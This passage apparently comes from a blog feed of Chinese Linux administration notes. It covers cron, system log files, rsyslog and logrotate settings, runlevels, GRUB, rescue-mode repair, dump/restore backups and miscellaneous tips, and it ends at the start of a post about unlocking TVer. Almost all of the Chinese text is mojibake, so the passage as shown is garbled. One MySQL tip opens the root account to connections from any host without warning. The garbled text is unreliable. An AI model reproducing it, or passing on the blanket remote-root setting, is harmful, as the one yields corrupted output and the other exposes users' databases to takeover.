<li>é™¤äº†ç”¨é€—å·ï¼ˆ,ï¼‰æ¥åˆ†åˆ«è¡¨ç¤ºå¤šä¸ªæ—¶é—´æ®µï¼Œä¾‹å¦‚â€œ8,9,12â€è¡¨ç¤º8æœˆã€9æœˆå’Œ12æœˆã€‚è¿˜å¯ä»¥ç”¨å‡å·ï¼ˆ-ï¼‰æ¥è¡¨ç¤ºä¸€æ®µè¿ç»­çš„æ—¶é—´å‘¨æœŸï¼ˆä¾‹å¦‚å­—æ®µâ€œæ—¥â€çš„å–å€¼ä¸ºâ€œ12-15â€ï¼Œåˆ™è¡¨ç¤ºæ¯æœˆçš„12ï½15æ—¥ï¼‰ã€‚ä»¥åŠç”¨é™¤å·ï¼ˆ/ï¼‰è¡¨ç¤ºæ‰§è¡Œä»»åŠ¡çš„é—´éš”æ—¶é—´ï¼ˆä¾‹å¦‚â€œ*/2â€è¡¨ç¤ºæ¯éš”2åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ä»»åŠ¡ï¼‰</li>
<li>åœ¨crondæœåŠ¡çš„è®¡åˆ’ä»»åŠ¡å‚æ•°ä¸­ï¼Œæ‰€æœ‰å‘½ä»¤ä¸€å®šè¦ç”¨ç»å¯¹è·¯å¾„çš„æ–¹å¼æ¥å†™</li>
</ul>
</li>
</ul>
<h2 id="æ—¥å¿—ç®¡ç†"><a href="#æ—¥å¿—ç®¡ç†" class="headerlink" title="æ—¥å¿—ç®¡ç†"></a>æ—¥å¿—ç®¡ç†</h2><p>  /var/log/cron  è®°å½•äº†å®šæ—¶ä»»åŠ¡ç›¸å…³æ—¥å¿—</p>
<p>  /var/log/cups/ è®°å½•äº†æ‰“å°ä¿¡æ¯çš„æ—¥å¿—</p>
<p>  /var/log/dmesg  è®°å½•äº†ç³»ç»Ÿåœ¨å¼€æœºæ—¶è‡ªæ£€çš„ä¿¡æ¯</p>
<p>  /var/log/btmp  å§è®°å½•é”™è¯¯ç™»å½•çš„æ—¥å¿—,è¯¥æ–‡ä»¶æ˜¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶,åªèƒ½ç”¨lastbå‘½ä»¤æŸ¥çœ‹</p>
<p>  /var/log/lastlog  è®°å½•ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´æ—¥å¿—,ä¹Ÿæ˜¯äºŒè¿›åˆ¶æ–‡ä»¶,ç”¨lastlogå‘½ä»¤æŸ¥çœ‹</p>
<p>  /var/log/maillog  è®°å½•é‚®ä»¶ä¿¡æ¯</p>
<p>  /var/log/message  è®°å½•ç³»ç»Ÿé‡è¦çš„ä¿¡æ¯çš„æ—¥å¿—</p>
<p>  /var/log/secure  è®°å½•éªŒè¯å’Œæˆæƒçš„æ–¹é¢ä¿¡æ¯,è®¾è®¡ç”¨æˆ·å¯†ç éƒ½ä¼šè®°å½•</p>
<p>  /var/log/wtmp    æ°¸ä¹…è®°å½•æ‰€æœ‰ç”¨æˆ·çš„ç™»å½•æ³¨é”€ä¿¡æ¯,è®°å½•çš„ç”¨æˆ·çš„å¯åŠ¨é‡å¯å…³æœºæ—¶é—´,åªèƒ½ç”¨lastå‘½ä»¤æŸ¥çœ‹</p>
<p>  /var/run/utmp   è®°å½•å½“å‰å·²ç»ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯,æ–‡ä»¶ä¼šä¼´éšç€ç”¨æˆ·çš„ç™»å½•å’Œæ³¨é”€ä¸æ–­çš„å˜åŒ–,åªèƒ½ç”¨w,who,userså‘½ä»¤æ¥æŸ¥çœ‹</p>
<h3 id="rsyslogdæ—¥å¿—æœåŠ¡"><a href="#rsyslogdæ—¥å¿—æœåŠ¡" class="headerlink" title="rsyslogdæ—¥å¿—æœåŠ¡"></a>rsyslogdæ—¥å¿—æœåŠ¡</h3><p>  åŸºæœ¬æ—¥å¿—åŒ…å«å››åˆ—:</p>
<ul>
<li>äº‹ä»¶å‘ç”Ÿçš„æ—¶é—´</li>
<li>äº§ç”Ÿæ—¶é—´çš„ä¸»æœºå</li>
<li>äº§ç”Ÿäº‹ä»¶çš„æœåŠ¡å</li>
<li>äº§ç”Ÿçš„æ—¥å¿—å…·ä½“ä¿¡æ¯</li>
</ul>
<p>  /etc/rsyslog.conf é…ç½®æ–‡ä»¶å†…å®¹</p>
<p>  ä¾‹å­: authpriv.*    /var/log/secure</p>
<p>  #<code>æœåŠ¡åç§°  [è¿æ¥ç¬¦å·]  æ—¥å¿—ç­‰çº§     æ—¥å¿—æ‰€åœ¨çš„ä½ç½®</code></p>
<ul>
<li><p>æœåŠ¡åç§°</p>
<table>
<thead>
<tr>
<th>æœåŠ¡åç§°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>auth</td>
<td>å®‰å…¨å’Œè®¤è¯ç›¸å…³æ¶ˆæ¯(ä¸æ¨èç”¨authprivæ›¿ä»£)</td>
</tr>
<tr>
<td>authpriv</td>
<td>å®‰å…¨å’Œè®¤è¯çš„ç›¸å…³æ¶ˆæ¯</td>
</tr>
<tr>
<td>cron</td>
<td>ç³»ç»Ÿå®šæ—¶ä»»åŠ¡crontå’Œatäº§ç”Ÿçš„æ—¥å¿—</td>
</tr>
<tr>
<td>daemon</td>
<td>å„ä¸ªå®ˆæŠ¤è¿›ç¨‹ç›¸å…³çš„æ—¥å¿—</td>
</tr>
<tr>
<td>kern</td>
<td>å†…æ ¸äº§ç”Ÿçš„æ—¥å¿—</td>
</tr>
<tr>
<td>local10-local7</td>
<td>ä¸ºæœ¬åœ°æœåŠ¡ä½¿ç”¨é¢„ç•™çš„æœåŠ¡</td>
</tr>
<tr>
<td>lpr</td>
<td>æ‰“å°äº§ç”Ÿçš„æ—¥å¿—</td>
</tr>
<tr>
<td>ftp</td>
<td>ftpå®ˆæŠ¤è¿›ç¨‹äº§ç”Ÿçš„æ—¥å¿—</td>
</tr>
</tbody></table>
</li>
<li><p>è¿æ¥ç¬¦å·</p>
<table>
<thead>
<tr>
<th>è¿æ¥ç¬¦å·</th>
<th>è¯†åˆ«ç­‰çº§</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>è¡¨ç¤ºæ‰€æœ‰çš„æ—¥å¿—ç­‰çº§.æ¯”å¦‚authpriv.*è¡¨ç¤ºauthprivè®¤è¯æœåŠ¡ä¿¡æ¯äº§ç”Ÿçš„æ—¥å¿—æ‰€æœ‰çš„æ—¥å¿—ç­‰çº§éƒ½è®°å½•</td>
</tr>
<tr>
<td>.</td>
<td>ä»£è¡¨åªè¦æ¯”åé¢ç­‰çº§é«˜çš„(åŒ…å«è¯¥ç­‰çº§)æ—¥å¿—éƒ½è®°å½•ä¸‹æ¥,æ¯”å¦‚cron.infoå°±æ˜¯ä»£è¡¨cronäº§ç”Ÿçš„æ—¥å¿—æ¯”infoé«˜çš„éƒ½è®°å½•</td>
</tr>
<tr>
<td>.-=</td>
<td>è¡¨ç¤ºåªè®°å½•æ‰€éœ€è¦çš„ç­‰çº§,,å…¶ä»–ç­‰çº§ä¸ä»…å½•</td>
</tr>
<tr>
<td>.!</td>
<td>è¡¨ç¤ºé™¤äº†è¯¥ç­‰çº§çš„æ—¥å¿—å¤–å…¶ä»–ç­‰çº§éƒ½è®°å½•</td>
</tr>
</tbody></table>
</li>
<li><p>æ—¥å¿—ç­‰çº§</p>
<table>
<thead>
<tr>
<th>ç­‰çº§åç§°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>debug</td>
<td>ä¸€èˆ¬çš„è°ƒè¯•ä¿¡æ¯çš„è¯´æ˜</td>
</tr>
<tr>
<td>info</td>
<td>åŸºæœ¬çš„é€šçŸ¥ä¿¡æ¯</td>
</tr>
<tr>
<td>notice</td>
<td>æ™®é€šä¿¡æ¯,ä½†æœ‰ä¸€å®šé‡è¦æ€§</td>
</tr>
<tr>
<td>warning</td>
<td>è­¦å‘Šç­‰çº§,ä½†è¿˜ä¸ä¼šå½±å“æœåŠ¡å’Œç³»ç»Ÿè¿è¡Œ</td>
</tr>
<tr>
<td>err</td>
<td>é”™è¯¯ä¿¡æ¯,è¯´æ˜å¯ä»¥å½±å“åˆ°æœåŠ¡æˆ–ç³»ç»Ÿè¿è¡Œ</td>
</tr>
<tr>
<td>crit</td>
<td>ä¸´ç•ŒçŠ¶æ€ä¿¡æ¯</td>
</tr>
<tr>
<td>alert</td>
<td>è­¦å‘ŠçŠ¶æ€ä¿¡æ¯,å¿…é¡»ç«‹å³é‡‡å–è¡ŒåŠ¨`</td>
</tr>
<tr>
<td>emerg</td>
<td>ç´§æ€¥ç­‰çº§ä¿¡æ¯,ç³»ç»Ÿggæˆ–å³å°†gg</td>
</tr>
</tbody></table>
</li>
</ul>
<h3 id="æ—¥å¿—è½®æ›¿"><a href="#æ—¥å¿—è½®æ›¿" class="headerlink" title="æ—¥å¿—è½®æ›¿"></a>æ—¥å¿—è½®æ›¿</h3><ul>
<li><p>æ—¥å¿—æ–‡ä»¶çš„å‘½åè§„åˆ™</p>
<ul>
<li><p>å¦‚æœé…ç½®æ–‡ä»¶ä¸­æœ‰dateextå‚æ•°,å°±ä¼šä»¥æ—¥æœŸä½œä¸ºæ—¥å¿—æ–‡ä»¶çš„åç¼€</p>
</li>
<li><p>å¦‚æœæ²¡æœ‰åŠ dateextå‚æ•°,æ—¥å¿—æ¸©ç…¦ä¼šè‡ªåŠ¨æ”¹å,æŒ‰ç…§è‡ªç„¶æ•°åºåˆ—è‡ªåŠ¨å¾€ä¸ŠåŠ </p>
</li>
</ul>
</li>
<li><p>æ—¥å¿—è½®æ›¿çš„é…ç½®æ–‡ä»¶</p>
<p>/etc/logrotate.conf</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>å‚æ•°è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>daily</td>
<td>æ—¥å¿—è½®æ›¿çš„å‘¨æœŸæ˜¯æ¯å¤©</td>
</tr>
<tr>
<td>weekly</td>
<td>å‘¨æœŸæ˜¯æ¯å‘¨</td>
</tr>
<tr>
<td>monthly</td>
<td>æ¯æœˆ</td>
</tr>
<tr>
<td>rotate æ•°å­—</td>
<td>ä¿ç•™æ—¥å¿—æ–‡ä»¶çš„ä¸ªæ•°,0æ˜¯æ²¡æœ‰å¤‡ä»½</td>
</tr>
<tr>
<td>compress</td>
<td>æ—¥å¿—è½®æ›¿æ—¶,æ—§çš„æ—¥å¿—è¿›è¡Œå‹ç¼©</td>
</tr>
<tr>
<td>create mode owner group</td>
<td>å»ºç«‹æ–°çš„æ—¥å¿—,åŒæ—¶æŒ‡å®šæ–°æ—¥å¿—çš„æƒé™å’Œæ‰€æœ‰è€…å’Œæ‰€å±ç»„.å¦‚create 0600 root utmp</td>
</tr>
<tr>
<td>mail address</td>
<td>æ—¥å¿—è½®æ›¿çš„æ—¶å€™,è¾“å‡ºå†…å®¹é€šè¿‡å³é”®å‘é€åˆ°æŒ‡å®šé‚®ä»¶åœ°å€.mail é‚®ä»¶åœ°å€</td>
</tr>
<tr>
<td>missingok</td>
<td>å¦‚æœæ—¥å¿—ä¸å­˜åœ¨,å¿½ç•¥è¯¥æ—¥å¿—è­¦å‘Šä¿¡æ¯</td>
</tr>
<tr>
<td>notifempty</td>
<td>æ—¥å¿—ä¸ºç©ºæ–‡ä»¶,åˆ™ä¸è¿›è¡Œæ—¥å¿—è½®æ›¿</td>
</tr>
<tr>
<td>minsize å¤§å°</td>
<td>æ—¥å¿—è½®æ›¿çš„æœ€å°å€¼,åªæœ‰æ—¥å¿—è¾¾åˆ°è¿™ä¸ªå€¼æ‰ä¼šè½®æ›¿</td>
</tr>
<tr>
<td>size å¤§å°</td>
<td>æ—¥å¿—åªæœ‰å¤§äºæŒ‡å®šå¤§å°æ‰ä¼šè½®æ›¿,è€Œä¸æ˜¯æŒ‰ç…§æ—¶é—´è½®æ›¿. æ¯”å¦‚ size 100k</td>
</tr>
<tr>
<td>dateext</td>
<td>ä½¿ç”¨æ—¥æœŸä½œä¸ºæ—¥å¿—è½®æ›¿æ–‡ä»¶çš„åç¼€</td>
</tr>
</tbody></table>
</li>
</ul>
<p>  rpmåŒ…å®‰è£…ä¸éœ€è¦æ‰‹åŠ¨åšæ—¥å¿—è½®æ›¿,åªæœ‰æºç åŒ…éœ€è¦</p>
<p>  logratateå‘½ä»¤</p>
<p>  <code>logrotate [option]    é…ç½®æ–‡ä»¶å</code>  é»˜è®¤çš„é…ç½®æ–‡ä»¶ä¸º/etc/logrotate.conf</p>
<p>  -v   æ˜¾ç¤ºæ—¥å¿—è½®æ›¿çš„è¿‡ç¨‹,</p>
<p>  -f å¼ºåˆ¶æ—¥å¿—è½®æ›¿,å¿½ç•¥æ¡ä»¶æ˜¯å¦ç¬¦åˆ.</p>
<h2 id="å¯åŠ¨ç®¡ç†"><a href="#å¯åŠ¨ç®¡ç†" class="headerlink" title="å¯åŠ¨ç®¡ç†"></a>å¯åŠ¨ç®¡ç†</h2><h3 id="è¿è¡Œçº§åˆ«"><a href="#è¿è¡Œçº§åˆ«" class="headerlink" title="è¿è¡Œçº§åˆ«"></a>è¿è¡Œçº§åˆ«</h3><table>
<thead>
<tr>
<th>è¿è¡Œçº§åˆ«</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>å…³æœº</td>
</tr>
<tr>
<td>1</td>
<td>å•ç”¨æˆ·æ¨¡å¼,ä¸»è¦ç”¨äºç³»ç»Ÿä¿®å¤</td>
</tr>
<tr>
<td>2</td>
<td>ä¸å®Œå…¨çš„å‘½ä»¤è¡Œæ¨¡å¼,ä¸å«nfsæœåŠ¡</td>
</tr>
<tr>
<td>3</td>
<td>å®Œå…¨çš„å‘½ä»¤è¡Œæ¨¡å¼,å°±æ˜¯æ ‡å‡†å­—ç¬¦ç•Œé¢</td>
</tr>
<tr>
<td>4</td>
<td>ç³»ç»Ÿä¿ç•™</td>
</tr>
<tr>
<td>5</td>
<td>å›¾å½¢æ¨¡å¼</td>
</tr>
<tr>
<td>6</td>
<td>é‡å¯åŠ¨</td>
</tr>
</tbody></table>
<ul>
<li>è¿è¡Œçº§åˆ«å‘½ä»¤</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">runlevel #æŸ¥çœ‹è¿è¡Œçº§åˆ«</span><br><span class="line">init è¿è¡Œçº§åˆ« #æ”¹å˜è¿è¡Œçº§åˆ«å‘½ä»¤</span><br></pre></td></tr></table></figure>

<ul>
<li>ç³»ç»Ÿé»˜è®¤è¿è¡Œçº§åˆ« </li>
</ul>
<p>â€‹       åœ¨æ–‡ä»¶/etc/inittab,ä¿®æ”¹é…ç½®æ–‡ä»¶å³å¯.</p>
<p>â€‹        è¿™ä¸ªé…ç½®æ–‡ä»¶åœ¨æœ€æ–°çš„å‘è¡Œç‰ˆä¸­ä»¥åŠä¸ç”Ÿæ•ˆäº†,<code>sudo systemctl set-default runlevel5.target</code>è¿è¡Œçº§åˆ«ç›¸åŒ,è¯­æ³•æ”¹æˆå¦‚ä¸Šå³å¯</p>
<h3 id="å¯åŠ¨è¿‡ç¨‹"><a href="#å¯åŠ¨è¿‡ç¨‹" class="headerlink" title="å¯åŠ¨è¿‡ç¨‹"></a>å¯åŠ¨è¿‡ç¨‹</h3><p>![linux sys ](<a href="https://github.com/LycsHub/ImageHosting/raw/master/linux">https://github.com/LycsHub/ImageHosting/raw/master/linux</a> sys .jpg)</p>
<p>â€œå†…æ ¸è§£å‹å¹¶ä¸”è‡ªæ£€â€è¿™ä¸€æ­¥ä¹‹åå› ä¸ºlinuxé»˜è®¤è°ƒç”¨çš„æ˜¯ideæ¥å£çš„é©±åŠ¨æ— æ³•åŠ è½½sataæ¥å£ç¡¬ç›˜,è€Œè£…æœ‰sataé©±åŠ¨æ¨¡å—åœ¨ç¡¬ç›˜ä¸­,å½¢æˆæ­»é”.</p>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜linuxå¼•å…¥äº†ä¸€ä¸ªå«åšinitramfsçš„æ–‡ä»¶æ”¾åœ¨bootç›®å½•ä¸‹,åœ¨mbråŠ è½½å¼•å¯¼ç¨‹åºçš„æ—¶å€™åŠ è½½è¿™ä¸ªæ–‡ä»¶,è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªç±»ä¼¼æ•´ä¸ªlinuxçš„æ–‡ä»¶ç³»ç»Ÿç›®å½•çš„æ–‡ä»¶,è¢«ç³»ç»Ÿå†…æ ¸åŠ è½½ä¹‹ålinuxå¯ä»¥è·³è¿‡è¯»å–ç¡¬ç›˜çš„æ­¥éª¤,ç›´æ¥åœ¨iniramfsä¸­è¯»å–æ‰€éœ€è¦çš„é©±åŠ¨å’Œä¾èµ–,è§£å†³æ­»é”é—®é¢˜</p>
<p>åœ¨â€æŒ‚è½½çœŸæ­£çš„æ ¹ç›®å½•â€åç³»ç»Ÿå¼€å§‹è°ƒç”¨å¯åŠ¨ç¨‹åº,å¹¶ä¸”æ ¹æ®å„ç§æ–‡ä»¶ç¡®å®šå¯åŠ¨çš„ç³»ç»Ÿçš„è¿è¡Œçº§åˆ«å’Œéœ€è¦å¯åŠ¨çš„æœåŠ¡,æœ€åè¿›å…¥ç³»ç»Ÿå®Œæˆå¼€æœº</p>
<ul>
<li><p>å…³äºè°ƒç”¨/etc/rc[0-6].dæ–‡ä»¶</p>
<p>ç”±è¿™ä¸ªè„šæœ¬æ–‡ä»¶æŒ‰ç…§ä¸åŒçš„è¿è¡Œçº§åˆ«å¯åŠ¨ç›¸åº”çš„ç¨‹åº,</p>
<ul>
<li>kå¼€å¤´çš„æ–‡ä»¶æ˜¯æŒ‰ç…§æ•°å­—é¡ºåºé»˜è®¤å…³é—­(kill)</li>
<li>så¼€å¤´çš„æ–‡ä»¶æ˜¯æŒ‰ç…§æ•°å­—é¡ºåºé»˜è®¤å¯åŠ¨(start)</li>
</ul>
</li>
</ul>
<h3 id="grubé…ç½®æ–‡ä»¶"><a href="#grubé…ç½®æ–‡ä»¶" class="headerlink" title="grubé…ç½®æ–‡ä»¶"></a>grubé…ç½®æ–‡ä»¶</h3><p>/boot/grub/grub.conf</p>
<p>![linux grub](<a href="https://github.com/LycsHub/ImageHosting/raw/master/linux">https://github.com/LycsHub/ImageHosting/raw/master/linux</a> grub.jpg)</p>
<p>è¯¥æ–‡ä»¶ä¸­default=0æ˜¯å¯åŠ¨ç¬¬ä¸€ä¸ªæ“ä½œç³»ç»Ÿ</p>
<p>timeoutæ˜¯ç­‰å¾…æ—¶é—´</p>
<p>hiddenmenuæ˜¯éšè—èœå•</p>
<h4 id="grubåŠ å¯†å’Œè°ƒæ•´å­—ç¬¦ç•Œé¢åˆ†è¾¨ç‡"><a href="#grubåŠ å¯†å’Œè°ƒæ•´å­—ç¬¦ç•Œé¢åˆ†è¾¨ç‡" class="headerlink" title="grubåŠ å¯†å’Œè°ƒæ•´å­—ç¬¦ç•Œé¢åˆ†è¾¨ç‡"></a>grubåŠ å¯†å’Œè°ƒæ•´å­—ç¬¦ç•Œé¢åˆ†è¾¨ç‡</h4><h4 id="grubåŠ å¯†"><a href="#grubåŠ å¯†" class="headerlink" title="grubåŠ å¯†"></a>grubåŠ å¯†</h4><ol>
<li>ç”ŸæˆåŠ å¯†å¯†ç ä¸² <code>grub-md5-crypt</code></li>
<li>åœ¨grub.confä¸­åŠ å…¥<code>password --md5 åŠ å¯†åå†…å®¹</code></li>
</ol>
<h4 id="å­—ç¬¦ç•Œé¢åˆ†è¾¨ç‡è°ƒæ•´"><a href="#å­—ç¬¦ç•Œé¢åˆ†è¾¨ç‡è°ƒæ•´" class="headerlink" title="å­—ç¬¦ç•Œé¢åˆ†è¾¨ç‡è°ƒæ•´"></a>å­—ç¬¦ç•Œé¢åˆ†è¾¨ç‡è°ƒæ•´</h4><p>æ²¡å•¥å±Œç”¨</p>
<h3 id="ç³»ç»Ÿä¿®å¤æ¨¡å¼"><a href="#ç³»ç»Ÿä¿®å¤æ¨¡å¼" class="headerlink" title="ç³»ç»Ÿä¿®å¤æ¨¡å¼"></a>ç³»ç»Ÿä¿®å¤æ¨¡å¼</h3><ul>
<li>å•ç”¨æˆ·æ¨¡å¼</li>
</ul>
<p>åœ¨grubå¯åŠ¨çš„ç•Œé¢é€‰æ‹©æŒ‰eè¿›å…¥ç¼–è¾‘ç„¶åé€‰æ‹©å†…æ ¸æ¥ç€æŒ‰e,quitååŠ ä¸€ä¸ª1ä¿å­˜åé€€å›ç•Œé¢ç„¶åbå¯åŠ¨</p>
<ul>
<li><p>å…‰ç›˜ä¿®å¤æ¨¡å¼</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">å…ˆè¿›å…¥æ•‘æ´æ¨¡å¼</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ä»¥ä¸‹æ¼”ç¤ºçš„ä¾‹å­æ˜¯è¯¯åˆ æ–‡ä»¶inittab</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<p>chroot /mnt/sysimage#æ›´æ”¹ä¸»ç›®å½•è¿›å…¥ç³»ç»Ÿ</p>
<p>cd /root</p>
<p>rpm -qf /etc/inittab #æŸ¥è¯¢/etc/inittabå±äºå“ªä¸ªåŒ…</p>
<p>mkdir /mnt/cdrom #å»ºç«‹æŒ‚è½½ç‚¹</p>
<p>  mount /dev/sr0 /mnt/cdrom #æŒ‚è½½å…‰ç›˜</p>
<p>  rpm2cpio /mnt/cdrom/Packages/åŒ…å | cpio -idv ./etc/inittab # æå–inittabåˆ°å½“å‰ç›®å½•<br>  cp /etc/inittab /etc/inittab  #å¤åˆ¶æ–‡ä»¶åˆ°æŒ‡å®šä½ç½®</p>
<h2 id="æ•°æ®å¤‡ä»½"><a href="#æ•°æ®å¤‡ä»½" class="headerlink" title="æ•°æ®å¤‡ä»½"></a>æ•°æ®å¤‡ä»½</h2><p>éœ€è¦å¤‡ä»½ç›®å½•:</p>
<p>/root</p>
<p>/home</p>
<p>/var/spool/mail</p>
<p>/etc</p>
<p>å…¶ä»–ç›®å½•</p>
<ul>
<li>apacheå¤‡ä»½çš„æ•°æ®<ul>
<li>é…ç½®æ–‡ä»¶</li>
<li>ç½‘é¡µä¸»ç›®å½•</li>
<li>æ—¥å¿—æ–‡ä»¶</li>
</ul>
</li>
<li>mysqléœ€è¦å¤‡ä»½çš„æ•°æ®<ul>
<li>æºç åŒ…:/usr/local/mysql/data</li>
<li>rpmåŒ…:/var/lib/mysql</li>
</ul>
</li>
</ul>
<h3 id="å¤‡ä»½å‘½ä»¤"><a href="#å¤‡ä»½å‘½ä»¤" class="headerlink" title="å¤‡ä»½å‘½ä»¤"></a>å¤‡ä»½å‘½ä»¤</h3><ul>
<li><p>dumpå‘½ä»¤</p>
<p><code>dump [option] å¤‡ä»½åæ–‡ä»¶å æºæ–‡ä»¶æˆ–è€…ç›®å½•</code></p>
<p>-level:0-9ä¸ªå¤‡ä»½ç­‰çº§</p>
<p>-f:æ–‡ä»¶å</p>
<p>-u:å¤‡ä»½æˆåŠŸå,æŠŠå¤‡ä»½æ—¶é—´è®°å½•åœ¨/etc/dumpdatesæ–‡ä»¶</p>
<p>-v:æ˜¾ç¤ºå¤‡ä»½è¿‡ç¨‹ä¸­è¾“å‡ºæ›´å¤šä¿¡æ¯</p>
<p>-j:è°ƒæ¢bzlibåº“å‹ç¼©å¤‡ä»½æ–‡ä»¶,å…¶å®å°±æ˜¯æŠŠå¤‡ä»½æ–‡ä»¶å‹ç¼©ä¸º.bz2æ ¼å¼</p>
<p>-W:æ˜¾ç¤ºå…è®¸è¢«dumpçš„åˆ†åŒºå¤‡ä»½ç­‰çº§åŠå¤‡ä»½æ—¶é—´</p>
</li>
<li><p>restoreå‘½ä»¤</p>
<p><code>restore [mode] [option]</code></p>
<p>4ä¸ªæ¨¡å¼ä¸èƒ½æ··ç”¨</p>
<p>-C æ¯”è¾ƒå¤‡ä»½æ•°æ®å’Œå®é™…æ•°æ®çš„å˜åŒ–</p>
<p>-i è¿›å…¥äº¤äº’æ¨¡å¼,æ‰‹å·¥é€‰æ‹©éœ€è¦æ¢å¤çš„æ–‡ä»¶</p>
<p>-t  æŸ¥çœ‹æ¨¡å¼,ç”¨äºæŸ¥çœ‹å¤‡ä»½æ–‡ä»¶ä¸­ç”¨æœ‰å“ªäº›æ•°æ®</p>
<p>-r è¿˜åŸæ¨¡å¼,ç”¨äºæ•°æ®è¿˜åŸ</p>
<p>option</p>
<p>-f æŒ‡å®šå¤‡ä»½æ–‡ä»¶çš„æ–‡ä»¶å</p>
</li>
</ul>
<h2 id="æ‚é¡¹"><a href="#æ‚é¡¹" class="headerlink" title="æ‚é¡¹"></a>æ‚é¡¹</h2><p><code>apt-get install lrzsz</code>å®‰è£…lrzszè®©linuxæ”¯æŒxshellè‡ªå¸¦çš„zmodem</p>
<ul>
<li><p>ç¼“å­˜cacheå’Œç¼“å†²bufferçš„åŒºåˆ«</p>
</li>
<li><p>cacheæ˜¯åˆ©ç”¨å†…å­˜åŠ é€Ÿæ•°æ®ä»ç¡¬ç›˜è¯»å–çš„é€Ÿåº¦</p>
</li>
<li><p>bufferåˆ™æ˜¯åˆ©ç”¨å†…å­˜åŠ é€Ÿæ•°æ®å†™å…¥ç¡¬ç›˜çš„é€Ÿåº¦</p>
</li>
</ul>
<p>init3ä¸‹ç»ˆç«¯è¾“å…¥ä¸­æ–‡æ–¹æ³•ï¼š</p>
<p>åˆ©ç”¨ï¼šzhconï¼Œè¾“å…¥å‘½ä»¤<code>zhcon --utf8</code></p>
<p>è¿›å…¥ç»ˆç«¯ç•Œé¢åä½¿ç”¨CTRL+2è¿›è¡Œè¾“å…¥æ³•åˆ‡æ¢</p>
<p>ubuntu å›¾å½¢åŒ–ï¼Œåº”ç”¨ä¸­å¿ƒçš„å›¾æ ‡å¿«æ·æ–¹å¼ï¼Œåº”ç”¨åœ¨/usr/share/application</p>
<ul>
<li>mysqlå¼€å¯è¿œç¨‹è®¿é—®</li>
</ul>
<p>ä½¿ç”¨SSHè¿æ¥åˆ°æœåŠ¡å™¨ï¼Œç™»å½•åˆ°MySQL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p æ•°æ®åº“rootå¯†ç </span><br></pre></td></tr></table></figure>

<p>å†™å…¥SQLè¯­å¥,å¼€å¯è¿œç¨‹è®¿é—®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt;  use mysql;</span><br><span class="line">mysql&gt;  update user set host = &#x27;%&#x27; where user = &#x27;root&#x27;;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œä¸‹é¢çš„è¯­å¥ï¼ŒæŸ¥çœ‹è®¾ç½®æ˜¯å¦ç”Ÿæ•ˆï¼ˆæ˜¾ç¤º%çš„å€¼ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select host,user from user where user=&#x27;root&#x27;</span><br></pre></td></tr></table></figure>

<p>é€€å‡ºMySQLå‘½ä»¤ï¼Œå›åˆ°Linuxå‘½åæ¨¡å¼ï¼Œé‡å¯MySQL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart mysqld</span><br></pre></td></tr></table></figure>

<p><a href="https://support.websoft9.com/docs/mysql/zh/stack-accounts.html#mysql">https://support.websoft9.com/docs/mysql/zh/stack-accounts.html#mysql</a></p>
<p><a href="https://support.websoft9.com/docs/linux/zh/#%E6%94%B9%E8%BF%9B">https://support.websoft9.com/docs/linux/zh/#%E6%94%B9%E8%BF%9B</a></p>
<p><strong>iconv  -f gbk -t utf-8 index.html &gt; aautf8.html</strong></p>
]]></content>
      <categories>
        <category>æ“ä½œç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>åŸºç¡€æ“ä½œ</tag>
      </tags>
  </entry>
  <entry>
    <title>tverè§£é”ä¸è¿½å‰§æ¨è</title>
    <url>/2022/02/05/tver%E8%A7%A3%E9%94%81%E4%B8%8E%E8%BF%BD%E5%89%A7%E6%8E%A8%E8%8D%90/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‡æœŸä½™é¢ä¸å¤šï¼Œé©¬ä¸Šå°±è¦å¼€å§‹æ–°çš„æ¬ç –äº†ï¼Œæ˜¥èŠ‚æœŸé—´æ— èŠç–¯ç‹‚çœ‹æ—¥å‰§ï¼Œç‰¹æ­¤æ°´ä¸€ç¯‡blogï¼Œè®°å½•ä¸€ä¸‹è‡ªå·±ä½¿ç”¨æœ€å°‘æµé‡è§£é”tveræµåª’ä½“</p>
